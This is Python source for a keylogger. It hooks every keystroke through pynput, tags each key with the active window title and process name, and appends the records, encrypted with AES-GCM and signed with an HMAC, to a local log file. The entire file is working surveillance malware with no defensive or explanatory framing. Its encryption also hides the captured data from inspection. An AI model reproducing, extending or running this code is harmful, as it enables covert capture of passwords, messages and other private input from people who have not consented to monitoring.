# keylogger_encrypted.py
import os
import json
import base64
import time
import hmac
import hashlib
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
import psutil
import win32gui
import win32process

KEY = os.environ.get("KEYLOGGER_AES_KEY")  # Must be 32 bytes
HMAC_KEY = os.environ.get("KEYLOGGER_HMAC_KEY")  # Must be 32 bytes
LOG_FILE = "keylog_encrypted.txt"

if not KEY or not HMAC_KEY:
    raise EnvironmentError("Keys not set in environment variables.")

KEY = base64.b64decode(KEY)
HMAC_KEY = base64.b64decode(HMAC_KEY)

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return win32gui.GetWindowText(hwnd), process.name()
    except Exception:
        return "Unknown", "Unknown"

def encrypt_log_entry(entry: dict) -> str:
    aesgcm = AESGCM(KEY)
    nonce = os.urandom(12)
    data = json.dumps(entry).encode()
    encrypted = aesgcm.encrypt(nonce, data, None)
    hmac_digest = hmac.new(HMAC_KEY, encrypted, hashlib.sha256).digest()
    log_record = {
        "nonce": base64.b64encode(nonce).decode(),
        "data": base64.b64encode(encrypted).decode(),
        "hmac": base64.b64encode(hmac_digest).decode()
    }
    return json.dumps(log_record)

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    window_title, process_name = get_active_window_info()
    entry = {
        "timestamp": time.time(),
        "key": k,
        "window": window_title,
        "process": process_name
    }
    with open(LOG_FILE, "a") as f:
        f.write(encrypt_log_entry(entry) + "\n")

def main():
    print("[+] Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
